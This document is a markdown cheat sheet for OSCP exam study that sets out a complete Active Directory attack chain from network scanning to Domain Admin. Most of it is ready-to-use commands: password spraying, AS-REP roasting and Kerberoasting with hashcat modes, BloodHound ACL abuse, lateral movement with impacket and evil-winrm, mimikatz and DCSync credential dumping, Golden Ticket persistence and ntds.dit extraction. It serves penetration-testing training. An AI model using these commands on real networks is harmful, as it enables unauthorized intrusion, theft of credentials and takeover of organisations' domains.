# Active Directory — OSCP Master Reference
## Complete Decision Tree + Tools Table + Port Guide + Reaction Guide

> **For:** OSCP exam preparation and authorized penetration testing labs only.
> **Covers:** Full AD attack chain — nmap to Domain Admin

---

## MASTER DECISION TREE — Nmap to Domain Admin

```
START: Target IP Range Given
            │
            ▼
┌─────────────────────────────┐
│  nmap -sn 192.168.x.0/24   │  ← Find live hosts
└─────────────────────────────┘
            │
            ▼
┌─────────────────────────────┐
│  nmap -sC -sV -p- DC_IP    │  ← Full port scan
└─────────────────────────────┘
            │
     ┌──────┴──────────────────────────────────┐
     │                                         │
Port 88 open?                           Port 88 NOT open
     │                                         │
     ▼                                   Workstation/Server
CONFIRMED DC                             (not DC — enum later)
     │
     ▼
Update /etc/hosts
DC01.corp.local + workstations
     │
     ├────────────────────────────────────────────┐
     ▼                                            ▼
PORT 445 (SMB)                             PORT 135 (RPC)
     │                                            │
     ├─ Null session?                             ├─ Null session?
     │   smbclient -N -L //DC_IP                 │   rpcclient -U "" -N
     │   smbmap -H DC_IP                         │
     │        │                                  ├─ enumdomusers → userlist.txt
     │   YES ─┤                                  ├─ getdompwinfo → LOCKOUT THRESHOLD
     │        ├─ SYSVOL accessible?              └─ enumdomgroups
     │        │   → Browse for Groups.xml
     │        │   → gpp-decrypt → PLAINTEXT PASS
     │        └─ Custom shares?
     │            → grep -ri "password"
     │
     ├────────────────────────────────────────────┐
     ▼                                            ▼
PORT 389 (LDAP)                          PORT 53 (DNS)
     │                                            │
     ├─ Anonymous bind?                           └─ dig axfr corp.local @DC_IP
     │   ldapsearch -x -H ldap://DC_IP               → Zone transfer?
     │        │                                         YES → full network map!
     │   YES ─┤
     │        ├─ description field → passwords?
     │        ├─ DONT_REQUIRE_PREAUTH flag → AS-REP users
     │        └─ ldapdomaindump → HTML reports
     │
     ▼
═══════════════════════════════════
HAVE USER LIST? → YES → CONTINUE
═══════════════════════════════════
     │
     ├─ Kerbrute userenum → validate/expand userlist
     │
     ▼
CHECK PASSWORD POLICY FIRST!
rpcclient getdompwinfo / nxc smb --pass-pol
     │
     ├─ Lockout = 0  → spray freely
     ├─ Lockout = 3  → max 2 attempts per user
     └─ Lockout = 5  → max 3-4 attempts per user
     │
     ▼
┌─────────────────────────────────────────┐
│  AS-REP ROASTING (NO CREDS NEEDED)      │
│  GetNPUsers -usersfile userlist.txt      │
│  hashcat -m 18200                        │
└─────────────────────────────────────────┘
     │
     ├─ Hash cracked? → FIRST CREDENTIAL OBTAINED
     │
     └─ No vulnerable users? → Password Spray
         nxc smb DC_IP -u users.txt -p 'Password123!'
         kerbrute passwordspray
              │
              └─ Valid cred found? → FIRST CREDENTIAL OBTAINED


═══════════════════════════════════════════════════
FIRST CREDENTIAL OBTAINED
═══════════════════════════════════════════════════
     │
     ├─────────────────────────────────────────────┐
     ▼                                             ▼
KERBEROASTING                              BLOODHOUND COLLECT
GetUserSPNs -request                       bloodhound-python -c All
hashcat -m 13100 (RC4)                           │
hashcat -m 19700 (AES)                     Import .zip
     │                                     Shortest Path to DA
     ├─ Cracked?                                  │
     └─ Validate nxc smb               ┌──────────┴───────────────┐
                                        │                          │
                                   ACL EDGES?              OWNED PATHS?
                                        │                          │
                              GenericAll/WriteDACL         AdminTo/HasSession
                              WriteOwner/ForceChangePW     MemberOf DA


═══════════════════════════════════════════════════
ACL ABUSE PATH
═══════════════════════════════════════════════════
     │
     ├─ GenericAll on USER
     │   ├─ Password Reset → Set-DomainUserPassword
     │   └─ SPN Set → Kerberoast → hashcat -m 13100
     │
     ├─ GenericAll on GROUP
     │   └─ Add-DomainGroupMember → Domain Admins
     │
     ├─ WriteDACL on DOMAIN OBJECT
     │   └─ Add-DomainObjectAcl -Rights DCSync → RUN DCSYNC
     │
     └─ WriteOwner
         └─ Set-DomainObjectOwner → Add GenericAll → attack


═══════════════════════════════════════════════════
LATERAL MOVEMENT PATH
═══════════════════════════════════════════════════
     │
     nxc smb /24 → Pwn3d! on which machines?
     │
     ├─ Port 5985 open? → evil-winrm (BEST SHELL)
     ├─ Port 445 open?  → wmiexec (quiet) / psexec (SYSTEM)
     └─ Port 135 open?  → dcomexec (last resort)
     │
     New machine → Mimikatz / secretsdump → MORE HASHES
     │
     Repeat → until DC reached


═══════════════════════════════════════════════════
DOMAIN COMPROMISE
═══════════════════════════════════════════════════
     │
     ├─ secretsdump -just-dc → ALL DOMAIN HASHES
     │   Save: Administrator NTHASH + krbtgt NTHASH
     │
     ├─ psexec/wmiexec/evil-winrm → DA SHELL
     │   type C:\Users\Administrator\Desktop\proof.txt
     │
     └─ PERSISTENCE
         ├─ impacket-ticketer (Golden Ticket) → 10yr DA
         ├─ vssadmin → ntds.dit → secretsdump LOCAL
         └─ hashcat -m 1000 bulk crack all hashes
```

---

## PORT REFERENCE TABLE

| Port | Service | Means | Tools | Attacks |
|------|---------|-------|-------|---------|
| **53** | DNS | DC confirmed | `dig`, `nslookup`, `nmap` | Zone transfer: `dig axfr domain @DC_IP` |
| **88** | Kerberos | **DC confirmed** | `kerbrute`, `impacket` | AS-REP Roast, Kerberoast, Golden/Silver Ticket |
| **135** | RPC | Windows RPC | `rpcclient`, `impacket-dcomexec` | Null session enum, DCOM lateral move |
| **139/445** | SMB | File sharing | `smbclient`, `smbmap`, `nxc`, `crackmapexec` | Null session, share browse, relay, PtH |
| **389** | LDAP | Directory service | `ldapsearch`, `ldapdomaindump` | Anonymous bind, user/group dump |
| **636** | LDAPS | LDAP over SSL | `ldapsearch` with SSL | Same as LDAP |
| **464** | Kpasswd | Password change | — | Brute force (if no lockout) |
| **3268** | Global Catalog | Multi-domain | `ldapsearch` | Cross-domain user search |
| **3269** | GC over SSL | Multi-domain SSL | `ldapsearch` | Same as above |
| **3389** | RDP | Remote Desktop | `xfreerdp`, `nxc rdp` | Password spray, credential login |
| **5985** | WinRM | PS Remoting HTTP | `evil-winrm`, `nxc winrm` | Shell via creds/hash |
| **5986** | WinRM SSL | PS Remoting HTTPS | `evil-winrm -S` | Shell via creds/hash |

---

## COMPLETE TOOLS TABLE

| Tool | Category | What It Does | When to Use | Command Skeleton |
|------|----------|-------------|-------------|-----------------|
| `nmap` | Recon | Port scan + service detect | Always first | `nmap -sC -sV -p- --open -T4 -oN out.txt IP` |
| `nbtscan` | Recon | NetBIOS names + DC tag | Quick host ID | `nbtscan 192.168.x.0/24` |
| `arp-scan` | Recon | ARP host discovery | ICMP blocked | `sudo arp-scan -l` |
| `smbclient` | SMB | Browse + download shares | Null session | `smbclient -N -L //DC_IP` |
| `smbmap` | SMB | Permissions on shares | Check read/write | `smbmap -H DC_IP` |
| `nxc` / `crackmapexec` | Multi | SMB/WinRM/RDP enum + spray | Everything | `nxc smb /24 -u user -p pass` |
| `rpcclient` | RPC | User list + password policy | Null session RPC | `rpcclient -U "" -N DC_IP` |
| `enum4linux-ng` | Multi | SMB+RPC+LDAP all-in-one | Quick full enum | `enum4linux-ng -A DC_IP` |
| `ldapsearch` | LDAP | Raw LDAP queries | Anonymous bind | `ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local"` |
| `ldapdomaindump` | LDAP | HTML reports from LDAP | With creds | `ldapdomaindump -u 'corp\user' -p 'pass' ldap://DC_IP` |
| `kerbrute` | Kerberos | User enum + password spray | Kerberos port 88 | `kerbrute userenum --dc DC_IP -d corp.local users.txt` |
| `bloodhound-python` | BloodHound | Data collection from Kali | Have creds | `bloodhound-python -u user -p pass -d corp.local -c All` |
| `SharpHound` | BloodHound | Data collection from Windows | Windows foothold | `SharpHound.exe -c All` |
| `BloodHound` | BloodHound | Attack path visualization | After collection | GUI — Shortest Path to DA |
| `GetNPUsers.py` | Kerberos | AS-REP Roasting | No creds needed | `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass` |
| `GetUserSPNs.py` | Kerberos | Kerberoasting | Need valid cred | `impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request` |
| `hashcat` | Cracking | Hash cracking | After getting hash | `hashcat -m 18200 hash.txt rockyou.txt` |
| `john` | Cracking | Hash cracking | Alternative to hashcat | `john hash.txt --wordlist=rockyou.txt` |
| `gpp-decrypt` | Creds | Decrypt GPP passwords | Groups.xml found | `gpp-decrypt "ENCRYPTED_STRING"` |
| `evil-winrm` | Shell | PowerShell shell via WinRM | Port 5985 open | `evil-winrm -i IP -u user -p pass` |
| `impacket-psexec` | Shell | SYSTEM shell via SMB | Admin on port 445 | `impacket-psexec corp/user:pass@IP` |
| `impacket-wmiexec` | Shell | Admin shell via WMI | Quiet shell needed | `impacket-wmiexec corp/user:pass@IP` |
| `impacket-smbexec` | Shell | Shell via SMB (stealth) | psexec fails | `impacket-smbexec corp/user:pass@IP` |
| `impacket-atexec` | Shell | Single command execution | No shell needed | `impacket-atexec corp/user@IP -hashes :HASH "whoami"` |
| `impacket-dcomexec` | Shell | Shell via DCOM | WMI/WinRM fail | `impacket-dcomexec corp/user:pass@IP -object MMC20` |
| `impacket-secretsdump` | Creds | Remote hash dump | Admin access | `impacket-secretsdump corp/user:pass@IP` |
| `mimikatz` | Creds | LSASS + SAM + DCSync | Windows foothold | `sekurlsa::logonpasswords` |
| `PowerView` | Enum | AD enumeration + ACL | Windows foothold | `Get-DomainUser`, `Find-LocalAdminAccess` |
| `Rubeus` | Kerberos | Roasting + ticket abuse | Windows foothold | `Rubeus.exe kerberoast /format:hashcat` |
| `impacket-getTGT` | Kerberos | Generate .ccache ticket | PtT from Kali | `impacket-getTGT corp.local/user:pass` |
| `impacket-ticketer` | Kerberos | Golden/Silver ticket | Have krbtgt hash | `impacket-ticketer -nthash HASH -domain-sid SID -domain DOM user` |
| `PrintSpoofer` | PrivEsc | SeImpersonate → SYSTEM | SeImpersonatePriv | `PrintSpoofer64.exe -i -c cmd` |
| `GodPotato` | PrivEsc | SeImpersonate → SYSTEM | Newer Windows | `GodPotato.exe -cmd "cmd /c whoami"` |
| `vssadmin` | Persistence | Shadow copy + ntds.dit | DA on DC | `vssadmin create shadow /for=C:` |
| `ntdsutil` | Persistence | NTDS backup + ntds.dit | DA on DC | `ntdsutil "activate instance ntds" "ifm" "create full C:\Temp" quit quit` |

---

## WHAT YOU NEED — Resources Table

| Resource | Where to Get | Used For |
|----------|-------------|---------|
| `rockyou.txt` | `/usr/share/wordlists/rockyou.txt` | Hash cracking |
| SecLists usernames | `/usr/share/seclists/Usernames/` | kerbrute enum |
| SecLists passwords | `/usr/share/seclists/Passwords/` | Password spray |
| `PowerView.ps1` | `/opt/PowerView.ps1` or GitHub | AD enum from Windows |
| `SharpHound.exe` | BloodHound releases / GitHub | BloodHound collection |
| `mimikatz.exe` | `/opt/mimikatz/` or GitHub | Credential harvesting |
| `Rubeus.exe` | GitHub GhostPack | Kerberos attacks |
| `PrintSpoofer64.exe` | GitHub itm4n | SeImpersonate privesc |
| `GodPotato.exe` | GitHub BeichenDream | SeImpersonate privesc |
| hashcat rules | `/usr/share/hashcat/rules/best64.rule` | Better cracking |

---

## HASHCAT MODE REFERENCE

| Hash Type | Starts With | Mode | When |
|-----------|------------|------|------|
| NT Hash | 32 char hex | `1000` | secretsdump / mimikatz output |
| NTLMv2 | `user::domain:` | `5600` | Responder capture |
| AS-REP | `$krb5asrep$23$` | `18200` | AS-REP Roasting |
| Kerberoast RC4 | `$krb5tgs$23$` | `13100` | Kerberoasting (fast) |
| Kerberoast AES | `$krb5tgs$18$` | `19700` | Kerberoasting (slow) |
| Cached creds | `$DCC2$` | `2100` | secretsdump cached |

---

## WHAT YOU FOUND — HOW TO REACT

| You Found | Immediate Reaction | Tool |
|-----------|-------------------|------|
| **Port 88 open** | Confirmed DC — scan all AD ports | nmap |
| **Domain name in nmap** | Update /etc/hosts immediately | manual |
| **SMB null session works** | Browse SYSVOL for Groups.xml | smbclient / smbmap |
| **Groups.xml in SYSVOL** | Run gpp-decrypt immediately | `gpp-decrypt "HASH"` |
| **Shares with READ access** | grep -ri "password" recursively | mount + grep |
| **RPC null session works** | enumdomusers + getdompwinfo | rpcclient |
| **Lockout threshold = 0** | Spray freely — no limit | nxc smb |
| **Lockout threshold = 3** | Max 2 attempts per user ever | nxc smb carefully |
| **DONT_REQUIRE_PREAUTH flag** | AS-REP Roast that user NOW | GetNPUsers |
| **AS-REP hash** | hashcat -m 18200 immediately | hashcat |
| **First valid credential** | bloodhound-python -c All | bloodhound-python |
| **First valid credential** | GetUserSPNs -request | Kerberoasting |
| **Kerberoast RC4 hash** | hashcat -m 13100 (fast crack) | hashcat |
| **Kerberoast AES hash** | hashcat -m 19700 (slow) or force RC4 | hashcat / Rubeus |
| **BloodHound: GenericAll on group** | Add-DomainGroupMember → DA | PowerView |
| **BloodHound: GenericAll on user** | Password reset or Kerberoast | PowerView |
| **BloodHound: WriteDACL on domain** | Add DCSync rights → secretsdump | PowerView |
| **BloodHound: HasSession DA** | Go to that machine → steal ticket | evil-winrm |
| **BloodHound: AdminTo edge** | PtH to that machine → dump creds | nxc / wmiexec |
| **(Pwn3d!) in nxc output** | secretsdump that machine remotely | impacket-secretsdump |
| **NT hash obtained** | Sweep /24 with that hash | nxc smb /24 -H HASH |
| **SeImpersonatePrivilege** | PrintSpoofer or GodPotato → SYSTEM | PrintSpoofer |
| **SeBackupPrivilege** | reg save SAM+SYSTEM → secretsdump LOCAL | reg save |
| **DA access confirmed** | DCSync immediately | secretsdump -just-dc |
| **krbtgt hash** | Golden Ticket → 10yr persistence | impacket-ticketer |
| **DA shell on DC** | type proof.txt + screenshot NOW | cmd |
| **DA shell on DC** | vssadmin → ntds.dit → all hashes | vssadmin |

---

## SHELL TOOL SELECTION

```
Need shell on target machine?
         │
    Port 5985 open?
    YES → evil-winrm (best — PowerShell + upload/download)
         │
    Port 445 open?
    ├─ Need SYSTEM?   → impacket-psexec  (noisy)
    ├─ Need quiet?    → impacket-wmiexec (preferred)
    └─ AV blocks?     → impacket-smbexec (stealth)
         │
    Port 135 open?
    └─ Last resort    → impacket-dcomexec -object MMC20
         │
    Single command only?
    └─ impacket-atexec "command"
```

---

## PRIVILEGE ESCALATION — QUICK REACT

```
whoami /priv output
     │
     ├─ SeImpersonatePrivilege Enabled
     │   └─ PrintSpoofer64.exe -i -c cmd    → SYSTEM
     │       GodPotato.exe -cmd "whoami"    → SYSTEM
     │
     ├─ SeBackupPrivilege Enabled
     │   └─ reg save HKLM\SAM + SYSTEM
     │       secretsdump LOCAL              → hashes
     │
     ├─ SeDebugPrivilege Enabled
     │   └─ mimikatz sekurlsa::logonpasswords → hashes
     │
     └─ AlwaysInstallElevated
         └─ msfvenom MSI → msiexec /i      → SYSTEM
```

---

## COMPLETE ATTACK PHASES — ONE LINE EACH

| Phase | Goal | Key Command |
|-------|------|-------------|
| **1. Host Discovery** | Find live machines | `nmap -sn 192.168.x.0/24` |
| **2. DC Identification** | Port 88+53+389 = DC | `nmap -sC -sV -p- DC_IP` |
| **3. /etc/hosts** | Hostname resolution | `echo "DC_IP DC01.corp.local" >> /etc/hosts` |
| **4. SMB Null** | Shares + SYSVOL | `smbclient -N -L //DC_IP` |
| **5. RPC Null** | Users + policy | `rpcclient -U "" -N DC_IP -c "enumdomusers"` |
| **6. Password Policy** | Lockout threshold | `rpcclient -c "getdompwinfo"` |
| **7. LDAP Anon** | More users + flags | `ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local"` |
| **8. AS-REP Roast** | First hash | `impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass` |
| **9. Crack Hash** | First password | `hashcat -m 18200 hash.txt rockyou.txt` |
| **10. BloodHound** | Attack path | `bloodhound-python -u user -p pass -d corp.local -c All` |
| **11. Kerberoast** | Service account hash | `impacket-GetUserSPNs corp.local/user:pass -dc-ip DC_IP -request` |
| **12. Crack TGS** | Service account pass | `hashcat -m 13100 hash.txt rockyou.txt` |
| **13. ACL Abuse** | Escalate via BloodHound | `Add-DomainObjectAcl -Rights DCSync` |
| **14. Lateral Move** | More hashes | `impacket-wmiexec corp/user:pass@TARGET_IP` |
| **15. Mimikatz** | Dump memory | `sekurlsa::logonpasswords` |
| **16. PtH Sweep** | Find admin access | `nxc smb /24 -u Administrator -H NTHASH` |
| **17. DCSync** | All domain hashes | `impacket-secretsdump corp/user:pass@DC_IP -just-dc` |
| **18. DA Shell** | Domain compromise | `impacket-psexec corp/Administrator@DC_IP -hashes :NTHASH` |
| **19. Proof** | Capture flag | `type C:\Users\Administrator\Desktop\proof.txt` |
| **20. Golden Ticket** | Persistence | `impacket-ticketer -nthash KRBTGT -domain-sid SID -domain corp.local FakeAdmin` |
| **21. NTDS.dit** | All hashes offline | `vssadmin create shadow /for=C:` → `secretsdump LOCAL` |

---

## NOTES TEMPLATE — OSCP REPORT READY

```markdown
## Target: corp.local

### Network Map
| Hostname | IP | Role | OS |
|----------|----|------|----|
| DC01 | x.x.x.x | Domain Controller | Windows Server 2019 |
| WS01 | x.x.x.x | Workstation | Windows 10 |

### Credentials Found
| Username | Password / Hash | Source | Access |
|----------|----------------|--------|--------|
| svc_backup | Password123! | AS-REP | Domain User |
| Administrator | :NTHASH | DCSync | Domain Admin |

### Password Policy
- Lockout Threshold: ___
- Min Length: ___
- Strategy: max ___ attempts per user

### Attack Path
1. AS-REP → svc_backup:Password123!
2. BloodHound → WriteDACL on domain object
3. DCSync rights → secretsdump → Admin hash
4. psexec → DA shell → proof.txt
```

---

## INSTALL CHECKLIST — Kali Setup

```bash
# Verify all tools present
which nmap nxc crackmapexec smbclient smbmap rpcclient ldapsearch \
      enum4linux-ng kerbrute bloodhound-python hashcat john \
      evil-winrm impacket-secretsdump impacket-psexec \
      impacket-wmiexec impacket-GetNPUsers impacket-GetUserSPNs \
      impacket-ticketer gpp-decrypt

# Install missing
sudo apt update
sudo apt install nmap smbclient samba-common-bin ldap-utils enum4linux-ng -y
pip install impacket netexec bloodhound
sudo gem install evil-winrm

# Download tools to /opt/
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -O /opt/PowerView.ps1
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe -O /opt/PrintSpoofer64.exe
wget https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe -O /opt/GodPotato.exe
wget https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip -O /tmp/mimi.zip
unzip /tmp/mimi.zip -d /opt/mimikatz/
```

---

*OSCP AD Master Reference — nmap to Domain Admin*
*Full series: Part 1A → 1B → 2A → 2B → 3A → 3B → 3C*
